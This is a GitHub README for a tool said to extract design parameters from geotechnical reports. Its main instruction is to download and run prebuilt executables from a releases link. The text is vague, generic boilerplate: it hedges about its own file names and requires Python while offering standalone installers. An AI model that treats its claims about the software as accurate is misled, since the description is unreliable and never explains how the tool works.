[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Oktadeveloper31/geotechnical-report-extractor/releases)

## 🚀 Getting Started

Welcome to the geotechnical-report-extractor! This tool helps you extract important design parameters from geotechnical reports and export them as CSV or PDF files. This process speeds up your engineering review, making it simple and efficient.

## 💻 System Requirements

Before you start, ensure your computer meets these basic requirements:

- Operating System: Windows, macOS, or Linux
- Python: Version 3.7 or later
- Memory: At least 4 GB RAM
- Disk Space: Minimum 100 MB available space

Once you reach the Releases page, look for the latest version. Click on the appropriate file for your operating system. Follow the installation instructions included in the download.

## 🛠️ Installation Steps

1. **Visit the Releases Page**: Click on the link above to go to the releases section.

2. **Select Your File**: Look for the file that matches your operating system. For example:
   - For Windows, you might see `geotechnical-report-extractor-windows.exe`
   - For macOS, it could be `geotechnical-report-extractor-macos.dmg`
   - For Linux users, there should be a compatible tarball file.

3. **Download the File**: Click on the file name to download it to your computer.

4. **Run the Installer**: 
   - **Windows**: Double-click the `.exe` file and follow the prompts.
   - **macOS**: Open the `.dmg` file, drag the app into your Applications folder.
   - **Linux**: Extract the tarball and run the program using terminal commands.

5. **Launch the Application**: After installation, find the application in your list of programs. Open it to begin.

## 📊 How to Use the Application

1. **Load Your Report**: Click on the "Upload" button to select the geotechnical report file you want to analyze. The application supports most PDF formats.

2. **Select Extraction Options**: Choose what parameters you want to extract. The application will offer options related to soil types, bearing capacity, or other relevant design elements.

3. **Run Analysis**: Press the "Extract" button. The application will process the document and extract the selected data.

4. **Export Results**: After the analysis, you can choose to export the results. Click on "Export" to save the data as a CSV or PDF file.

5. **Review Your Data**: Open the exported file to see the extracted parameters. Use them for your engineering review or project documentation.

## 🤔 Troubleshooting

If you run into any issues, here are a few common solutions:

- **File Not Supported**: Ensure your PDF is not password protected or scanned as an image. The application works best with standard, text-based PDFs.
- **Slow Performance**: If the application is slow, try closing other programs to free up system resources.
- **Output Issues**: If the extracted data is incorrect, check that you selected the right extraction options.

## 💬 Support and Feedback

For any questions or feedback, you can reach out via the Issues section on GitHub. We encourage users to contribute suggestions or report bugs. Your input helps improve the tool.

## 🚀 Key Features

- Simple and user-friendly interface
- Extracts a range of parameters relevant to engineering design
- Exports data in popular formats, CSV and PDF
- Fast processing times for efficient workflow
- Compatible with multiple operating systems

## 📈 Future Updates

We are continually working to improve the geotechnical-report-extractor. Future updates may include:

- Support for more file types
- Enhanced extraction options
- User-requested features based on feedback
